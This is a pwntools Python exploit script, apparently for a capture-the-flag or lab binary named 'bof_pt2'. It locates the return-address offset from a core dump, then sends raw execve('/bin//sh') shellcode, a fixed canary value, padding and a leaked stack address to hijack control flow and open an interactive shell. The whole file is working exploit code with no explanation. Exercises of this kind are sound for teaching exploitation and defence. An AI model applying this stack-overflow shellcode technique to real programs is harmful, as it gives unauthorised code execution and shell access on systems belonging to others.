from pwn import *

context.binary = binary = "./bof_pt2"
context.log_level = "debug"

elf = ELF(binary)
io = process(binary)

padding = cyclic(32)
padding += b"ABCD"
padding += cyclic(32)

io.recv()
io.sendline(padding)
io.wait()

corefile = Coredump("./core")

lenUntilRIP = cyclic_find(corefile.fault_addr) # string length until RIP is hit

print(hex(corefile.fault_addr))

firstPadding = cyclic(32)
cannary = b'ABCD'
secondPadding = cyclic(lenUntilRIP)


io = process(binary)

io.recvuntil("at ")
shellAddr = io.recvn(14)
io.recv()


payload = b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x90\x90"
payload += cannary
payload += secondPadding
payload += p64(int(shellAddr, 16))

io.send(payload)

io.interactive()
